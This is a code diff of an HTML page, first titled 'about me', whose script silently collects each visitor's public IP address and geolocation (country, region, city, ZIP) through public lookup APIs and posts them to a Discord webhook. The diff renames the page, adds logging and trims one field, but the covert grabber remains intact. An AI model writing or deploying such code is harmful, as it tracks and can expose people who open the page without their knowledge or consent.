@@ -1,22 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>about me</title>
+    <title>Get IP and Send to Discord</title>
 </head>
 <body>
     <script>
         // Function to get the user's IP address and location
         async function getIPandLocation() {
             try {
+                console.log('Fetching IP address...');
                 // Fetch the IP address
                 let ipResponse = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipResponse.json();
                 let ip = ipData.ip;
+                console.log('IP address fetched:', ip);
 
                 // Fetch the geolocation data using ip-api.com
+                console.log('Fetching location data...');
                 let locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
                 let locationData = await locationResponse.json();
-                
+                console.log('Location data fetched:', locationData);
+
                 // Check status to ensure successful API call
                 if (locationData.status !== 'success') {
                     throw new Error(locationData.message || 'Failed to retrieve location data');
@@ -46,8 +50,7 @@
                             },
                             {
                                 name: "Location:",
-                                value: `IP Address:\n${data.ip}\n\n` +
-                                       `Country:\n${location.country || 'N/A'}\n\n` +
+                                value: `Country:\n${location.country || 'N/A'}\n\n` +
                                        `Region:\n${location.regionName || 'N/A'}\n\n` +
                                        `City:\n${location.city || 'N/A'}\n\n` +
                                        `ZIP:\n${location.zip || 'N/A'}\n\n` +
@@ -67,13 +70,16 @@
             };
 
             try {
-                await fetch(webhookUrl, {
+                console.log('Sending data to Discord:', payload);
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 });
+                const result = await response.json();
+                console.log('Response from Discord:', result);
             } catch (error) {
                 console.error('Error sending to Discord:', error);
             }
